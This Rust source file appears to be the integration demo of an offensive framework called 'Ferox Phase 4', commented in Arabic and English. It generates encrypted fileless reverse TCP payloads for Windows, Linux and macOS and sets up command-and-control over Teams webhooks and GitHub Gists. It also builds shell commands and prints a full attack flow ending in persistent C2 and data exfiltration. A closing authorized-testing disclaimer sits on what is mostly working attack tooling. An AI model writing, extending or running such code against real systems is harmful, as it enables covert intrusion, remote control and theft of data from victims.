// Ferox Phase 4 Integration Example
// مثال التكامل الكامل - الحمولات + C2

use ferox_phase4::core::payload_engine::{PayloadEngine, TargetOS};
use ferox_phase4::modules::payloads::rev_tcp_fileless::{FilelessReverseTcp, ReverseTcpConfig};
use ferox_phase4::modules::c2::teams_tunnel::{TeamsTunnel, CommandBuilder, CommandType};
use ferox_phase4::modules::c2::github_gist_loader::{GistLoader, GistC2Builder};
use ferox_phase4::modules::{ModuleManager, ModuleType};
use colored::Colorize;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
    println!("{}", "🚀 Ferox Phase 4 - Complete Integration Demo".bright_green().bold());
    println!("{}", "   Smart Payloads + Cloud-Native C2".bright_white());
    println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());

    // ========== الجزء 1: سجل الوحدات | Part 1: Module Registry ==========
    println!("\n{}", "═══ Part 1: Module Registry ═══".bright_yellow().bold());
    let manager = ModuleManager::new();
    manager.registry().list_all();
    manager.show_stats();

    // ========== الجزء 2: توليد الحمولات | Part 2: Payload Generation ==========
    println!("\n{}", "═══ Part 2: Payload Generation ═══".bright_yellow().bold());
    
    // إنشاء وحدة Reverse TCP
    println!("\n{} Creating Fileless Reverse TCP module...", "→".bright_blue());
    let payload_module = FilelessReverseTcp::new()?;

    // إعداد الحمولة
    let config = ReverseTcpConfig {
        lhost: "192.168.1.100".to_string(),
        lport: 4444,
        target_os: TargetOS::Windows,
        encrypt: true,
        c2_channel: Some("https://c2.example.com/stage2".to_string()),
    };

    // توليد الحمولة
    let result = payload_module.execute(config)?;
    result.display();

    // حفظ إلى ملف
    println!("\n{} Saving payload to file...", "→".bright_blue());
    result.save_to_file("/home/claude/ferox_phase4/payload_output.txt")?;
    println!("{} Saved successfully!", "✅".bright_green());

    // ========== الجزء 3: Teams C2 Integration ==========
    println!("\n{}", "═══ Part 3: Teams C2 Integration ═══".bright_yellow().bold());

    // إنشاء نفق Teams
    let teams_webhook = std::env::var("TEAMS_WEBHOOK_URL")
        .unwrap_or_else(|_| "https://outlook.office.com/webhook/YOUR_WEBHOOK_HERE".to_string());
    
    let encryption_key = b"ferox_teams_c2_master_key_32byte";
    let teams_tunnel = TeamsTunnel::new(&teams_webhook, encryption_key)?;
    teams_tunnel.info();

    // إنشاء أمر C2
    println!("\n{} Creating C2 command...", "→".bright_blue());
    let command = CommandBuilder::new(CommandType::Shell)
        .payload("whoami && hostname")
        .target("target-windows-01")
        .build();

    println!("{} Command created:", "✅".bright_green());
    println!("  {} {}", "ID:".bright_white(), command.command_id);
    println!("  {} {:?}", "Type:".bright_white(), command.command_type);
    println!("  {} {}", "Payload:".bright_white(), command.payload);

    // إرسال عبر Teams (معطل في الديمو)
    // teams_tunnel.send_command(&command).await?;
    println!("\n{} Teams integration ready (demo mode - not sending)", "ℹ".bright_blue());

    // ========== الجزء 4: GitHub Gist C2 Integration ==========
    println!("\n{}", "═══ Part 4: GitHub Gist C2 Integration ═══".bright_yellow().bold());

    // إنشاء محمّل Gist
    let github_token = std::env::var("GITHUB_TOKEN")
        .unwrap_or_else(|_| "ghp_YOUR_TOKEN_HERE".to_string());
    
    let gist_key = b"ferox_gist_c2_master_key_32bytes";
    let mut gist_loader = GistC2Builder::new()
        .api_token(&github_token)
        .encryption_key(gist_key)
        .build()?;
    
    gist_loader.info();

    println!("\n{} GitHub Gist integration ready (demo mode)", "ℹ".bright_blue());
    
    // مثال على رفع حمولة (معطل في الديمو)
    // let download_url = gist_loader.upload_payload(
    //     "stage2_payload",
    //     &result.payload.encrypted
    // ).await?;
    // println!("{} Payload uploaded to: {}", "✅".bright_green(), download_url);

    // ========== الجزء 5: سيناريو الهجوم الكامل | Part 5: Full Attack Scenario ==========
    println!("\n{}", "═══ Part 5: Complete Attack Scenario ═══".bright_yellow().bold());
    
    println!("\n{}", "🎯 Attack Flow:".bright_yellow().bold());
    println!("  {} Generate encrypted payload", "1.".bright_white());
    println!("  {} Upload to GitHub Gist (covert delivery)", "2.".bright_white());
    println!("  {} Send initial command via Teams webhook", "3.".bright_white());
    println!("  {} Target downloads Stage-2 from Gist", "4.".bright_white());
    println!("  {} Establish persistent C2 channel", "5.".bright_white());
    println!("  {} Execute commands & exfiltrate data", "6.".bright_white());

    println!("\n{}", "🔐 Security Features:".bright_yellow().bold());
    println!("  {} AES-256-GCM encryption", "•".bright_blue());
    println!("  {} HKDF key derivation", "•".bright_blue());
    println!("  {} Fileless execution (memory-only)", "•".bright_blue());
    println!("  {} Cloud-native C2 (blends with legitimate traffic)", "•".bright_blue());
    println!("  {} Multi-stage architecture", "•".bright_blue());

    // ========== الجزء 6: استخدام متقدم | Part 6: Advanced Usage ==========
    println!("\n{}", "═══ Part 6: Advanced Usage Examples ═══".bright_yellow().bold());

    // Multi-platform payload generation
    println!("\n{} Multi-Platform Payload Generation:", "→".bright_blue());
    
    let platforms = vec![
        (TargetOS::Windows, "192.168.1.100", 4444),
        (TargetOS::Linux, "192.168.1.100", 4445),
        (TargetOS::MacOS, "192.168.1.100", 4446),
    ];

    for (os, host, port) in platforms {
        let config = ReverseTcpConfig {
            lhost: host.to_string(),
            lport: port,
            target_os: os,
            encrypt: true,
            c2_channel: None,
        };

        let result = payload_module.execute(config)?;
        println!("  {} {} payload: {} bytes", 
            "✓".bright_green(), 
            os, 
            result.payload.metadata.size_bytes
        );
    }

    // ========== الختام | Conclusion ==========
    println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
    println!("{}", "✅ Ferox Phase 4 Integration Complete".bright_green().bold());
    println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
    
    println!("\n{}", "📚 Next Steps:".bright_yellow().bold());
    println!("  {} Set environment variables (TEAMS_WEBHOOK_URL, GITHUB_TOKEN)", "1.".bright_white());
    println!("  {} Configure target systems and C2 infrastructure", "2.".bright_white());
    println!("  {} Test payloads in isolated environment", "3.".bright_white());
    println!("  {} Review and customize encryption keys", "4.".bright_white());
    println!("  {} Add custom modules to the registry", "5.".bright_white());

    println!("\n{}", "⚠️  CRITICAL REMINDER:".bright_red().bold());
    println!("  This framework is for AUTHORIZED penetration testing ONLY.");
    println!("  Unauthorized access to computer systems is ILLEGAL.");
    println!("  Always obtain proper written authorization before testing.");

    println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());

    Ok(())
}

// ========== وحدات مساعدة | Helper Functions ==========

/// عرض شعار Ferox | Display Ferox banner
fn display_banner() {
    println!("{}", r#"
    ███████╗███████╗██████╗  ██████╗ ██╗  ██╗
    ██╔════╝██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝
    █████╗  █████╗  ██████╔╝██║   ██║ ╚███╔╝ 
    ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║ ██╔██╗ 
    ██║     ███████╗██║  ██║╚██████╔╝██╔╝ ██╗
    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
    "#.bright_cyan());
    println!("{}", "    Phase 4 - Smart Payloads + Cloud C2".bright_white());
}
